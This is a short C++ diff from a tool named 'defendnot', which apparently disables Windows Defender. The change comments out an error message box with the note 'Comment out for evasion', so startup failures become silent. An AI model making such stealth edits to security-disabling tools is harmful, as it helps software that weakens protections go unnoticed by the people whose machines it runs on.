@@ -20,7 +20,8 @@ namespace {
             defendnot::startup();
             success = true;
         } catch (std::exception& err) {
-            MessageBoxA(nullptr, err.what(), "defendnot", MB_TOPMOST | MB_ICONERROR);
+            // Comment out for evasion
+            //MessageBoxA(nullptr, err.what(), "defendnot", MB_TOPMOST | MB_ICONERROR);
         }
 
         if (ipc) {
